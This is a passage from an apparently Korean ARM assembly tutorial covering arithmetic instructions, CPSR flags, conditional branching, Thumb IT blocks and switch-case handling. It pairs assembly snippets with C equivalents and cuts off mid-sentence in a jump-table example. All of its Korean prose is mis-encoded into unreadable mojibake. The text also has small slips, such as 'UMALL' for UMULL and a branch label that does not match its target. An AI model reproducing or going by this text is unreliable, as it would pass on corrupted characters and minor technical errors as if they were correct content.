ê°€ëŠ¥í•©ë‹ˆë‹¤.</p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">MOV</span> <span class="built_in">R0</span>, <span class="number">#0xa</span>            <span class="comment">; R0 = 0xa</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">R0</span>, <span class="built_in">R7</span>              <span class="comment">; R0 = R7</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">R4</span>, <span class="built_in">R4</span>, <span class="keyword">LSR</span> <span class="number">#21</span>     <span class="comment">; R4 = (R4 &gt;&gt; 21)</span></span><br></pre></td></tr></table></figure><p>ê¸°ì´ˆì ì¸ ì‚°ìˆ  ë° ë…¼ë¦¬ ì—°ì‚° ì¸ìŠ¤íŠ¸ëŸ­ì…˜ìœ¼ë¡œëŠ” <code>ADD</code> , <code>SUB</code> , <code>MUL</code> , <code>AND</code> , <code>ORR</code> , <code>EOR</code> ì´ ìˆìŠµë‹ˆë‹¤. ë‹¤ìŒ ì˜ˆì œì—ì„œ ì¼ë¶€ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì—ëŠ” <code>S</code> ì ‘ë¯¸ì‚¬ê°€ ë¶™ì–´ ìˆëŠ”ë°, ì‚°ìˆ  ì—°ì‚°ì˜ ê²°ê³¼ì— ë”°ë¼ <code>CPSR</code> ë ˆì§€ìŠ¤í„°ì˜ í”Œë˜ê·¸(e.g. zero ë¹„íŠ¸, negative ë¹„íŠ¸)ë¥¼ ê°±ì‹ í•´ì•¼ í•¨ì„ ì˜ë¯¸í•©ë‹ˆë‹¤.</p><ul><li>x86/64ì™€ëŠ” ë‹¬ë¦¬, ARM ì‚°ìˆ  ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì€ ê¸°ë³¸ì ìœ¼ë¡œ <code>CPSR</code> ì„ ê°±ì‹ í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤.</li></ul><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ADD</span> <span class="built_in">R3</span>, <span class="built_in">R9</span>              <span class="comment">; R3 = R3 + R9</span></span><br><span class="line"><span class="keyword">ADD</span> <span class="built_in">R11</span>, <span class="built_in">SP</span>, <span class="number">#8</span>         <span class="comment">; R11 = SP + 8</span></span><br><span class="line"><span class="keyword">ADD</span> <span class="built_in">R0</span>, <span class="built_in">R4</span>, <span class="keyword">LSL</span> <span class="number">#2</span>      <span class="comment">; R0 = (R4 &lt;&lt; 2)</span></span><br><span class="line"><span class="keyword">SUB</span> <span class="built_in">SP</span>, <span class="built_in">SP</span>, <span class="number">#0x1a8</span>      <span class="comment">; SP = SP - 0x1a8</span></span><br><span class="line"><span class="keyword">MUL</span> <span class="built_in">R2</span>, <span class="built_in">R3</span>, <span class="built_in">R5</span>          <span class="comment">; R2 = R3 * R5 (ê²°ê³¼ì˜ í•˜ìœ„ 32ë¹„íŠ¸ë§Œ ì €ì¥ë©ë‹ˆë‹¤)</span></span><br><span class="line"><span class="keyword">ANDS</span> <span class="built_in">R2</span>, <span class="built_in">R4</span>, <span class="number">#7</span>         <span class="comment">; R2 = R4 &amp; 7 (CPSRì„ ê°±ì‹ í•©ë‹ˆë‹¤)</span></span><br><span class="line"><span class="keyword">EOR</span> <span class="built_in">R3</span>, <span class="built_in">R3</span>, <span class="built_in">R1</span>, <span class="keyword">LSL</span> <span class="number">#3</span>  <span class="comment">; R3 = R3 ^ (R1 &lt;&lt; 3)</span></span><br><span class="line"><span class="keyword">EORS</span> <span class="built_in">R3</span>, <span class="built_in">R2</span>             <span class="comment">; R3 = R3 ^ R2 (CPSRì„ ê°±ì‹ í•©ë‹ˆë‹¤)</span></span><br><span class="line"><span class="keyword">ORR</span> <span class="built_in">R3</span>, <span class="built_in">R3</span>, <span class="built_in">R2</span>, <span class="keyword">LSL</span> <span class="number">#8</span>  <span class="comment">; R3 = R3 | (R2 &lt;&lt; 8)</span></span><br><span class="line"><span class="keyword">ORRS</span> <span class="built_in">R3</span>, <span class="built_in">R3</span>, <span class="number">#2</span>         <span class="comment">; R3 = R3 | 2 (CPSRì„ ê°±ì‹ í•©ë‹ˆë‹¤)</span></span><br><span class="line"><span class="keyword">ORRS</span> <span class="built_in">R3</span>, <span class="built_in">R2</span>             <span class="comment">; R3 = R3 | R2 (CPSRì„ ê°±ì‹ í•©ë‹ˆë‹¤)</span></span><br></pre></td></tr></table></figure><p><code>MUL</code> ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì€ ê²°ê³¼ì˜ í•˜ìœ„ 32ë¹„íŠ¸ë§Œì´ ëª©ì ì§€ ë ˆì§€ìŠ¤í„°ì— ì €ì¥ë˜ë©°, 64ë¹„íŠ¸ ê°’ ì „ì²´ê°€ í•„ìš”í•œ ê²½ìš° <code>SMULL</code> , <code>UMALL</code> ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì„ ì‚¬ìš©í•´ì•¼ í•©ë‹ˆë‹¤. ë˜í•œ ë‚˜ëˆ—ì…ˆ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì´ ì¡´ì¬í•˜ì§€ ì•ŠëŠ”ë°, (ARMv7-Rê³¼ ARMv7-Mì— <code>SDIV</code> , <code>UDIV</code> ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì´ ìˆê¸°ëŠ” í•©ë‹ˆë‹¤) ì‹¤ì œë¡œëŠ” ë‚˜ëˆ—ì…ˆì„ ì†Œí”„íŠ¸ì›¨ì–´ì ìœ¼ë¡œ êµ¬í˜„í•˜ì—¬ í•„ìš”í•œ ê²½ìš° í˜¸ì¶œí•˜ë„ë¡ í•©ë‹ˆë‹¤.</p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">MOV</span> <span class="built_in">R1</span>, <span class="built_in">R8</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">R0</span>, <span class="built_in">R6</span></span><br><span class="line"><span class="keyword">BL</span> __rt_udiv            <span class="comment">; ì†Œí”„íŠ¸ì›¨ì–´ì ìœ¼ë¡œ êµ¬í˜„í•œ ë‚˜ëˆ—ì…ˆ í•¨ìˆ˜</span></span><br></pre></td></tr></table></figure><h2 id="%EC%A1%B0%EA%B1%B4%EB%B6%80-%EB%B6%84%EA%B8%B0%EC%99%80-%EC%8B%A4%ED%96%89" tabindex="-1">ì¡°ê±´ë¶€ ë¶„ê¸°ì™€ ì‹¤í–‰</h2><p>ë°˜ë³µë¬¸ê³¼ ì¡°ê±´ë¬¸ì• ì„œ ì‚¬ìš©ë˜ëŠ” ì¡°ê±´ë¶€ ë¶„ê¸°ëŠ” <code>CPSR</code> ë ˆì§€ìŠ¤í„°ì—ì„œ ë‹¤ìŒê³¼ ê°™ì€ í”Œë˜ê·¸ë“¤ì„ ì‚¬ìš©í•©ë‹ˆë‹¤.</p><ul><li><code>N</code> (negative flag) - ê²°ê³¼ê°€ ìŒìˆ˜ì¸ ê²½ìš° (ìµœìƒìœ„ ë¹„íŠ¸ê°€ 1ì¸ ê²½ìš°) 1ì…ë‹ˆë‹¤.</li><li><code>Z</code> (zero flag) - ê²°ê³¼ê°€ 0ì´ë©´ 1ì…ë‹ˆë‹¤.</li><li><code>C</code> (carry flag) - ë¶€í˜¸ê°€ ì—†ëŠ” ì—°ì‚°ì˜ ê²°ê³¼ ì˜¤ë²„í”Œë¡œìš°ê°€ ë°œìƒí•˜ë©´ 1ì…ë‹ˆë‹¤.</li><li><code>V</code> (overflow flag) - ë¶€í˜¸ê°€ ìˆëŠ” ì—°ì‚°ì˜ ê²°ê³¼ ì˜¤ë²„í”Œë¡œìš°ê°€ ë°œìƒí•˜ë©´ 1ì…ë‹ˆë‹¤.</li><li><code>IT</code> (if-then bits) - Thumb ìƒíƒœì˜ <code>IT</code> ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì—ì„œ ì¡°ê±´ë¶€ ë¶„ê¸°ì˜ ì¡°ê±´ë“¤ì— í•´ë‹¹í•˜ëŠ”ë°, ë’¤ì—ì„œ ìì„¸íˆ ì„¤ëª…í•©ë‹ˆë‹¤.</li></ul><p>ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì€ ë‹¤ìŒê³¼ ê°™ì´ ì¡°ê±´ì„ ë‚˜íƒ€ë‚´ëŠ” ì ‘ë¯¸ì‚¬ ì¤‘ í•˜ë‚˜ë¥¼ ë¶™ì—¬ ì¡°ê±´ë¶€ë¡œ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><ul><li>e.g. <code>BLT</code> ëŠ” ì•„ë˜ í‘œì—ì„œ <code>LT</code> ì¡°ê±´ì´ ì°¸ì¸ ê²½ìš°ì—ë§Œ ë¶„ê¸°í•˜ë¼ëŠ” ì˜ë¯¸ë¡œ, x86/64ì—ì„œì˜ <code>JL</code> ê³¼ ê°™ìŠµë‹ˆë‹¤.</li></ul><table><thead><tr><th>ì ‘ë¯¸ì‚¬</th><th>ì˜ë¯¸</th><th>í”Œë˜ê·¸</th></tr></thead><tbody><tr><td><code>EQ</code></td><td>Equal</td><td><code>Z == 1</code></td></tr><tr><td><code>NE</code></td><td>Not equal</td><td><code>Z == 0</code></td></tr><tr><td><code>MI</code></td><td>Minus, negative</td><td><code>N == 1</code></td></tr><tr><td><code>PL</code></td><td>Plus, positive or zero</td><td><code>N == 0</code></td></tr><tr><td><code>HI</code></td><td>Unsigned higher/above</td><td><code>C == 1</code> and <code>Z == 0</code></td></tr><tr><td><code>LS</code></td><td>Unsigned lower/below</td><td><code>C == 0</code> or <code>Z == 1</code></td></tr><tr><td><code>GE</code></td><td>Signed greater than or equal</td><td><code>N == V</code></td></tr><tr><td><code>LT</code></td><td>Signed less than</td><td><code>N != V</code></td></tr><tr><td><code>GT</code></td><td>Signed greater than</td><td><code>Z == 0</code> and <code>N == V</code></td></tr><tr><td><code>LE</code></td><td>Signed less than or equal</td><td><code>Z == 1</code> or <code>N != V</code></td></tr></tbody></table><p>ë¹„êµë¥¼ ìœ„í•œ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ìœ¼ë¡œ <code>CBZ</code> , <code>CMP</code> , <code>TST</code> , <code>CMN</code> , <code>TEQ</code> ê°€ ìˆìœ¼ë©°, ë¹„êµ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì€ ê¸°ë³¸ê°’ìœ¼ë¡œ <code>CPSR</code> ì„ ê°±ì‹ í•˜ì§€ ì•ŠëŠ” ë‹¤ë¥¸ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ê³¼ ë‹¬ë¦¬ <code>CPSR</code> ì˜ í”Œë˜ê·¸ë“¤ì„ ìë™ìœ¼ë¡œ ê°±ì‹ í•©ë‹ˆë‹¤.</p><p>ê°€ì¥ í”í•œ ë¹„êµ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì€ <code>CMP</code> ë¡œ, <code>Rn</code> ì€ ë ˆì§€ìŠ¤í„°ì´ê³  <code>Operand2</code> ëŠ” ìƒìˆ˜, ë ˆì§€ìŠ¤í„°ì˜ ê°’ ë˜ëŠ” ë ˆì§€ìŠ¤í„°ì˜ ê°’ì— ë°°ëŸ´ ì‹œí”„í„°ë¥¼ ì‚¬ìš©í•œ ê°’ì…ë‹ˆë‹¤. <code>CMP</code> ëŠ” x86/64ì—ì„œì™€ ê°™ì´ <code>Rn - Operand2</code> ë¥¼ ì—°ì‚°í•˜ê³ , <code>CPSR</code> ì„ ê°±ì‹ í•œ í›„ ê²°ê³¼ë¥¼ ë²„ë¦½ë‹ˆë‹¤.</p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CMP</span> Rn, Operand2</span><br></pre></td></tr></table></figure><p>ë‹¤ìŒ ì—¬ëŸ¬ ë¸”ë¡ì´ ìˆëŠ” ì¡°ê±´ë¬¸ì—ì„œ ì¡°ê±´ ë¶„ê¸°ê°€ ì‚¬ìš©ë˜ëŠ” ì˜ˆì œì…ë‹ˆë‹¤.</p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">CMP.W</span> <span class="built_in">R3</span>, <span class="built_in">R7</span>, <span class="keyword">ASR</span> <span class="number">#31</span></span><br><span class="line"><span class="keyword">BLT</span> loc_less</span><br><span class="line"><span class="keyword">BGT</span> loc_greater</span><br><span class="line"><span class="keyword">CMP</span> <span class="built_in">R5</span>, <span class="built_in">R7</span></span><br><span class="line"><span class="keyword">BLS</span> loc_less</span><br><span class="line"></span><br><span class="line"><span class="symbol">loc_greater:</span></span><br><span class="line"><span class="keyword">SUBS</span> <span class="built_in">R5</span>, <span class="number">#7</span></span><br><span class="line"><span class="symbol">SBC.W</span> <span class="built_in">LR</span>, <span class="built_in">LR</span>, <span class="number">#0</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">loc_less:</span></span><br><span class="line"><span class="symbol">UMULL.W</span> <span class="built_in">R1</span>, <span class="built_in">R2</span>, <span class="built_in">R5</span>, <span class="built_in">R8</span></span><br><span class="line"><span class="symbol">SMULL.W</span> <span class="built_in">R0</span>, <span class="built_in">R4</span>, <span class="built_in">R7</span>, <span class="built_in">R8</span></span><br><span class="line"><span class="symbol">MLA.W</span> <span class="built_in">R3</span>, <span class="built_in">LR</span>, <span class="built_in">R8</span>, <span class="built_in">R2</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (R3 &lt; R7) &#123; <span class="keyword">goto</span> loc_less; &#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (R3 &gt; R7) &#123; <span class="keyword">goto</span> loc_greater; &#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (R5 &lt; R7) &#123; <span class="keyword">goto</span> loc_less; &#125;</span><br></pre></td></tr></table></figure><p>ë‹¤ìŒìœ¼ë¡œ í”í•œ ë¹„êµ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì€ <code>TST</code> ë¡œ, <code>CMP</code> ì™€ ë¬¸ë²•ì´ ê°™ìŠµë‹ˆë‹¤. ë§ˆì°¬ê°€ì§€ë¡œ x86/64ì˜ <code>TEST</code> ì™€ ê°™ì´ <code>Rn &amp; Operand2</code> ë¥¼ ì—°ì‚°í•˜ê³ , <code>CPSR</code> ì„ ê°±ì‹ í•œ í›„ ê²°ê³¼ë¥¼ ë²„ë¦½ë‹ˆë‹¤. <code>TST</code> ëŠ” ì£¼ë¡œ ì–´ë–¤ ê°’ì´ ë‹¤ë¥¸ ê°’ê³¼ ë™ì¼í•œì§€, ë˜ëŠ” íŠ¹ì • í”Œë˜ê·¸ë¥¼ ê²€ì‚¬í•˜ê¸° ìœ„í•´ ì‚¬ìš©í•©ë‹ˆë‹¤.</p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">TST</span> Rn, Operand2</span><br></pre></td></tr></table></figure><p>ë‹¤ìŒì€ íŠ¹ì • ë¹„íŠ¸ë¥¼ ê²€ì‚¬í•˜ì—¬ ì°¸ì¸ ê²½ìš° ë¶„ê¸°í•˜ëŠ” ì˜ˆì œì…ë‹ˆë‹¤.</p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">LDRH</span> <span class="built_in">R3</span>, [<span class="built_in">R5</span>,<span class="number">#0x14</span>]</span><br><span class="line"><span class="symbol">TST.W</span> <span class="built_in">R3</span>, <span class="number">#2</span></span><br><span class="line"><span class="keyword">BEQ</span> loc_10179DA</span><br><span class="line"><span class="comment">; ...</span></span><br><span class="line"><span class="symbol">loc_10179BE:</span></span><br><span class="line"><span class="keyword">LDRH</span> <span class="built_in">R2</span>, [<span class="built_in">R5</span>,<span class="number">#0x14</span>]</span><br><span class="line"><span class="symbol">TST.W</span> <span class="built_in">R2</span>, <span class="number">#4</span></span><br><span class="line"><span class="keyword">BEQ</span> loc_10179E8</span><br></pre></td></tr></table></figure><p><code>CBZ</code> ì™€ <code>CBNZ</code> ëŠ” Thumb ìƒíƒœì—ì„œ ìì£¼ ì“°ì´ëŠ” ë¹„êµ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì…ë‹ˆë‹¤. <code>CBZ</code> ëŠ” ë ˆì§€ìŠ¤í„° <code>Rn</code> ì˜ ê°’ì´ 0ì´ë©´ <code>label</code> ë¡œ ë¶„ê¸°í•˜ê³ , <code>CBNZ</code> ëŠ” 0ì´ ì•„ë‹ˆë©´ ë¶„ê¸°í•©ë‹ˆë‹¤. ì´ë“¤ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì€ ì£¼ë¡œ ì •ìˆ˜í˜• ë³€ìˆ˜ì˜ ê°’ì´ 0ì¸ì§€, ë˜ëŠ” í¬ì¸í„°ê°€ <code>NULL</code> ì¸ì§€ ê²€ì‚¬í•˜ê¸° ìœ„í•´ ì‚¬ìš©í•©ë‹ˆë‹¤.</p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CBZ</span> Rn, label</span><br><span class="line"><span class="keyword">CBNZ</span> Rn, label</span><br></pre></td></tr></table></figure><p>ë‹¤ìŒì€ í•¨ìˆ˜ê°€ ë°˜í™˜í•œ í¬ì¸í„°ê°€ <code>NULL</code> ì¸ì§€ ê²€ì‚¬í•˜ëŠ” ì˜ˆì œì…ë‹ˆë‹¤.</p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">BL</span> foo              <span class="comment">; í•¨ìˆ˜ fooëŠ” í¬ì¸í„°ë¥¼ ë°˜í™˜í•©ë‹ˆë‹¤.</span></span><br><span class="line"><span class="keyword">CBZ</span> <span class="built_in">R0</span>, loc_100BC8E</span><br><span class="line"><span class="comment">; ...</span></span><br><span class="line"><span class="symbol">loc_100BCE:</span></span><br><span class="line"><span class="keyword">MOVS</span> <span class="built_in">R0</span>, <span class="number">#1</span></span><br><span class="line"><span class="keyword">B</span> locret_100BCE4</span><br><span class="line"><span class="comment">; ...</span></span><br><span class="line"><span class="symbol">locret_100BCE4:</span></span><br><span class="line"><span class="symbol">POP.W</span> &#123;<span class="built_in">R3</span>-<span class="built_in">R8</span>,<span class="built_in">R11</span>,<span class="built_in">PC</span>&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = foo(...);</span><br><span class="line"><span class="keyword">if</span> (a == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span> <span class="number">1</span>; &#125;</span><br></pre></td></tr></table></figure><p>ë¶„ê¸° ì¸ìŠ¤íŠ¸ëŸ­ì…˜ <code>B</code> ì— ì¡°ê±´ ì ‘ë¯¸ì‚¬ë¥¼ ë¶™ì´ë©´ (e.g. <code>BEQ</code> , <code>BLE</code> , <code>BLT</code> , <code>BLS</code>) ì¡°ê±´ ë¶„ê¸°ë¥¼ ìˆ˜í–‰í•©ë‹ˆë‹¤. ëŒ€ë¶€ë¶„ì˜ ARM ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì—ëŠ” ì¡°ê±´ ì ‘ë¯¸ì‚¬ë¥¼ ë¶™ì—¬ ì¡°ê±´ë¶€ ì‹¤í–‰ì´ ê°€ëŠ¥í•˜ë©°, ì¡°ê±´ì´ ì°¸ì´ ì•„ë‹Œ ê²½ìš° ê·¸ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì€ <code>NOP</code> ì™€ ê°™ì´ ì·¨ê¸‰í•©ë‹ˆë‹¤. ì´ëŸ¬í•œ ì¡°ê±´ë¶€ ì‹¤í–‰ì€ ë¶„ê¸°ì— í•„ìš”í•œ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì˜ ìˆ˜ë¥¼ ì¤„ì´ëŠ” ë° ë„ì›€ì´ ë©ë‹ˆë‹¤.</p><p>ë‹¤ìŒì€ í¬ì¸í„°ê°€ <code>NULL</code> ì´ ì•„ë‹Œ ê²½ìš° êµ¬ì¡°ì²´ì˜ íŠ¹ì • í•„ë“œë¥¼ ë°˜í™˜í•˜ëŠ” ì˜ˆì œì…ë‹ˆë‹¤.</p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CMP</span> <span class="built_in">R0</span>, <span class="number">#0</span></span><br><span class="line"><span class="keyword">MOVEQ</span> <span class="built_in">R0</span>, <span class="number">#1</span></span><br><span class="line"><span class="symbol">LDRNEB</span> <span class="built_in">R0</span>, [<span class="built_in">R0</span>,<span class="number">#0x48</span>]</span><br><span class="line"><span class="keyword">BX</span> <span class="built_in">LR</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (a == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span> <span class="number">1</span>; &#125;</span><br><span class="line"><span class="keyword">else</span> &#123; <span class="keyword">return</span> a-&gt;off_48; &#125;</span><br></pre></td></tr></table></figure><h3 id="thumb-%EC%83%81%ED%83%9C%EC%97%90%EC%84%9C%EC%9D%98-%EC%A1%B0%EA%B1%B4%EB%B6%80-%EC%8B%A4%ED%96%89" tabindex="-1">Thumb ìƒíƒœì—ì„œì˜ ì¡°ê±´ë¶€ ì‹¤í–‰</h3><p>Thumb ìƒíƒœì—ì„œëŠ” <code>IT</code> (if-then) ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì„ ì‚¬ìš©í•´ì•¼ë§Œ ì¡°ê±´ë¶€ ì‹¤í–‰ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤. (<code>B</code> ëŠ” ì˜ˆì™¸ì…ë‹ˆë‹¤)</p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">ITxyz</span> cc</span><br></pre></td></tr></table></figure><p><code>IT</code> ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì€ ë’¤ë”°ë¥´ëŠ” ìµœëŒ€ 4ê°œì˜ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ê¹Œì§€ ì¡°ê±´ë¶€ë¡œ ì‹¤í–‰ë  ìˆ˜ ìˆë„ë¡ í•©ë‹ˆë‹¤. <code>cc</code> ëŠ” ì²«ì§¸ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì˜ ì‹¤í–‰ ì¡°ê±´ì´ë©°, <code>x</code> , <code>y</code> , <code>z</code> ëŠ” ê°ê° ë‘˜ì§¸, ì…‹ì§¸, ë„·ì§¸ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì˜ ì¡°ê±´ì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤. ì´ 3ê°œì˜ ì¡°ê±´ì€ <code>T</code> ë˜ëŠ” <code>E</code> ë¡œë§Œ ë‚˜íƒ€ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><ul><li><code>T</code> - <code>cc</code> ê°€ ì°¸ì´ë©´ ì‹¤í–‰í•©ë‹ˆë‹¤.</li><li><code>E</code> - <code>cc</code> ê°€ ê±°ì§“ì´ë©´ ì‹¤í–‰í•©ë‹ˆë‹¤.</li></ul><p>ë‹¤ìŒì€ if-else ë¸”ë¡ì„ <code>IT</code> ì¸ìŠ¤íŠ¸ëŸ­ì…˜ìœ¼ë¡œ ì‘ì„±í•œ ì˜ˆì œì…ë‹ˆë‹¤.</p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CMP</span> <span class="built_in">R3</span>, <span class="number">#0</span>          <span class="comment">; ë¹„êµ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ìœ¼ë¡œ, CPSRì„ ê°±ì‹ í•©ë‹ˆë‹¤.</span></span><br><span class="line"><span class="keyword">ITEE</span> NE             <span class="comment">; IT ë¸”ë¡ì„ ì‹œì‘í•©ë‹ˆë‹¤.</span></span><br><span class="line"><span class="symbol">CLZNE.W</span> <span class="built_in">R0</span>, <span class="built_in">R12</span>     <span class="comment">; ì²«ì§¸ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì€ ë¹„êµì˜ ê²°ê³¼ NE ì¡°ê±´ì´ ì°¸ì´ë©´ ì‹¤í–‰ë©ë‹ˆë‹¤.</span></span><br><span class="line"><span class="symbol">CLZEQ.W</span> <span class="built_in">R0</span>, <span class="built_in">R6</span>      <span class="comment">; ë‘˜ì§¸ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì€ NE ì¡°ê±´ì´ ê±°ì§“ì´ë©´ ì‹¤í–‰ë©ë‹ˆë‹¤.</span></span><br><span class="line"><span class="keyword">ADDEQ</span> <span class="built_in">R0</span>, <span class="number">#0x20</span>     <span class="comment">; ì…‹ì§¸ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì€ NE ì¡°ê±´ì´ ê±°ì§“ì´ë©´ ì‹¤í–‰ë©ë‹ˆë‹¤.</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (R3 != <span class="number">0</span>) &#123;</span><br><span class="line">    R0 = countleadzeros(R12);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    R0 = countleadzeros(R6);</span><br><span class="line">    R0 += <span class="number">0x20</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="switch-case-%EA%B5%AC%EB%AC%B8" tabindex="-1">Switch-case êµ¬ë¬¸</h3><p>Switch-case êµ¬ë¬¸ì€ ì—¬ëŸ¬ ë¬¶ìŒì˜ if-else ë¸”ë¡ê³¼ ê°™ìŠµë‹ˆë‹¤. ì»´íŒŒì¼ ì‹œì ì— ê° case ë¸”ë¡ì˜ ìœ„ì¹˜ë¥¼ ì•Œ ìˆ˜ ìˆìœ¼ë¯€ë¡œ, ì»´íŒŒì¼ëŸ¬ëŠ” ì í”„ í…Œì´ë¸”ì„ ìƒì„±í•˜ì—¬ switch-case êµ¬ë¬¸ì„ ì²˜ë¦¬í•©ë‹ˆë‹¤. ARM ìƒíƒœì—ì„œëŠ” ì í”„ í…Œì´ë¸”ì— ê° case ë¸”ë¡ì˜ ì£¼ì†Œë¥¼, Thumb ìƒíƒœì—ì„œëŠ” ë¸”ë¡ì˜ ì˜¤í”„ì…‹ì„ ì €ì¥í•©ë‹ˆë‹¤. ëŸ°íƒ€ì„ì—ì„œëŠ” ì í”„ í…Œì´ë¸”ì„ ì½ê³  ëª©ì ì§€ ì£¼ì†Œë¥¼ <code>PC</code> ë¡œ ë¶ˆëŸ¬ë“¤ì´ëŠ” ê°„ì ‘ ë¶„ê¸°(indirect branch)ë¥¼ ìˆ˜í–‰í•©ë‹ˆë‹¤.</p><p>ë‹¤ìŒì€ ARM ìƒíƒœì—ì„œ switch-case êµ¬ë¬¸ì˜ ì˜ˆì œì…ë‹ˆë‹¤. ARM ìƒíƒœì—ì„œ ê°„ì ‘ ë¶„ê¸°ëŠ” <code>PC</code> ë¥¼ ëª©ì ì§€ ë ˆì§€ìŠ¤í„°ë¡œ í•˜ëŠ” <code>LDR</code> ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì„ ì‚¬ìš©í•©ë‹ˆë‹¤.</p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CMP</span> <span class="built_in">R1</span>, <span class="number">#0xb</span>                <span class="comment">; R1ì´ caseì¸ë°, ì í”„ í…Œì´ë¸”ì˜ 